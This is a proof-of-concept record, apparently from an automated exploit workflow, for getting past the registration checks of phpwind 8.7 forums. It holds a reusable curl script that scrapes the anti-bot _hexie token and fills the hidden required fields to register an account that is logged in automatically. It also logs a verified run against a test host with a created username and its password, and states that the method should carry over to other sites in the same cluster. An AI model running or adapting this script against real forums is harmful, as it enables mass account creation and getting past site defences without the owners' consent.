# phpwind 8.7 注册三必填绕过（regreason + _hexie + apartment 地区ID）→ 注册成功且自动登录

- **code**: phpwind-8.7-注册三必填绕过-regreason-_hexie-apartment-地区id-注册成功且自动登录
- **kind**: poc
- **category**: auth-bypass
- **component**: phpwind 8.7（GBK）
- **severity**: medium
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 在 203.0.113.2:1852 实测：三轮逐步定位（① 缺 regreason →「请填写注册原因。」② 补后 →「字段 '现居住地' 填写有误」③ 再补 apartment=820001 + 正确 _hexie → HTTP 302 + cookie 出现 winduser=自动登录）。账号 kwx108345（uid=1045）可正常登录并浏览。**限制已实测**：同账号 GET post.php?fid=2 返回「提示信息」页（groupid==7 拦截），不能发帖。
- **path**: pocs/phpwind-8.7-注册三必填绕过-regreason-_hexie-apartment-地区id-注册成功且自动登录/poc.sh
- **created_at**: 2026-09-30T16:51:43.238Z
- **found_by**: exploit

## 描述

phpwind 8.7 在「需管理员验证」(rg_ifcheck=1) 配置下，注册表单有三个非显而易见的必填项，缺任何一个都只回显一个无字段名的通用「提示信息」页，导致难以定位。补齐后注册成功并自动登录（说明 rg_emailcheck=0 → yz=1 已激活）。

## 用法

```
# 关键：三个字段缺一不可，且 _hexie 必须从注册页实时提取（HTML 里 value 在 name 之前）
B=http://TARGET:PORT
CK=cookies.txt
curl -s -c $CK "$B/register.php" -o reg.html
HEXIE=$(grep -o 'value="[^"]*" name="_hexie"' reg.html | head -1 | sed 's/value="//;s/" name="_hexie"//')
curl -s -b $CK -c $CK -e "$B/register.php" \
  --data-urlencode "forward=" --data-urlencode "step=2" --data-urlencode "_hexie=$HEXIE" \
  --data-urlencode "regname=USER123" --data-urlencode "regpwd=PASS" --data-urlencode "regpwdrepeat=PASS" \
  --data-urlencode "regemail=USER123@163.com" --data-urlencode "rgpermit=1" \
  --data-urlencode "regreason=x" --data-urlencode "apartment=820001" \
  "$B/register.php?"
# 成功判据：HTTP 302 + cookie 出现 winduser（=自动登录，说明 yz=1）
# 失败判据：HTTP 200 且页面为「提示信息」页；逐步补齐后提示依次为：
#   请填写注册原因。 → 字段 '现居住地' 填写有误 → 302 成功
# apartment 合法值取自注册页内联的 var areas 数组（如 820001=澳门、110101=东城区），
#   服务端校验走 CustomerFieldData::checkData → type==area → checkArea($data)
```

## 正文

```
## 背景
phpwind 8.7，配置为「新会员需管理员验证」(rg_ifcheck=1)。注册提交后只返回通用
「提示信息」页，不含字段名，定位困难。

## 三个必填项（逐一实测确定）
| 顺序 | 缺失时提示 | 来源字段 | 说明 |
|---|---|---|---|
| 1 | `请填写注册原因。` | `regreason` | `register.class.php:105 setReason()`：`L::reg('rg_ifcheck')` 为真时强制 |
| 2 | `字段 '现居住地' 填写有误` | `apartment` | 自定义 area 类型字段，值为地区数字 ID |
| 3 | 通用反爬提示 | `_hexie` | 注册页隐藏域，值形如 `cn0zz`；**HTML 中 `value` 在 `name` 之前**，正则写反会取到空值 |

## 实测请求（成功）
```bash
B=http://203.0.113.2:1852
curl -s -c ck.txt "$B/register.php" -o reg.html
# 注意属性顺序：<input type="hidden" value="cn0zz" name="_hexie" />
HEXIE=$(grep -o 'value="[^"]*" name="_hexie"' reg.html | sed 's/value="//;s/" name="_hexie"//')

curl -s -b ck.txt -c ck.txt -e "$B/register.php" \
  --data-urlencode "forward=" --data-urlencode "step=2" --data-urlencode "_hexie=$HEXIE" \
  --data-urlencode "regname=kwx108345" --data-urlencode "regpwd=Abc@9911xy" \
  --data-urlencode "regpwdrepeat=Abc@9911xy" --data-urlencode "regemail=kwx108345@163.com" \
  --data-urlencode "rgpermit=1" --data-urlencode "regreason=测试" \
  --data-urlencode "apartment=820001" "$B/register.php?"
```
结果：`HTTP 302`，cookie 出现 `winduser`（= `register.php:298 if ($rgyz == 1) Cookie("winduser",...)`）
⇒ 同时证明 `rg_emailcheck=0`（`_setEmailCheck()` 令 `yz=1`），账号无需激活邮件即可登录。

## apartment 合法值（从注册页内联 `var areas` 数组提取）
```
areas['820001']=['澳门','820000','0'];
areas['820002']=['澳门特别行政区','820001','0'];
areas['110101']=['东城区','110100','1'];
areas['810001']=['香港','810000','1'];
```
服务端校验链：`registercheck.class.php:149 checkCustomerField` → `customerfieldservice.class.php:99 checkData`
→ `customerfielddata.class.php:245 checkData` → `type==area` 分支 → `checkArea($data)`。

## 重要限制（不要误判）
**注册成功 ≠ 能发帖。** `_setGroupid()`（`register.class.php:285-289`）：
```php
if ($this->data['groupid'] == 0)
    $this->data['groupid'] = L::reg('rg_ifcheck') ? 7 : -1;
```
目标 `rg_ifcheck=1` ⇒ 新账号 `groupid=7`（验证会员）。实测 `post.php?fid=2` 返回
「您还没通过管理员验证…」提示页。`groupid==7` 只拦发帖（`PwPost::postcheck()` /
`banUser()`），不拦登录、不拦头像上传、不拦消息页。

## 通用性
换站只需替换 TARGET 与 `apartment` 的一个合法地区 ID（同站群其它 phpwind 8.7 站点应通用，
因 `areas` 数据由后台地区库生成，取值在注册页内联可读）。
```
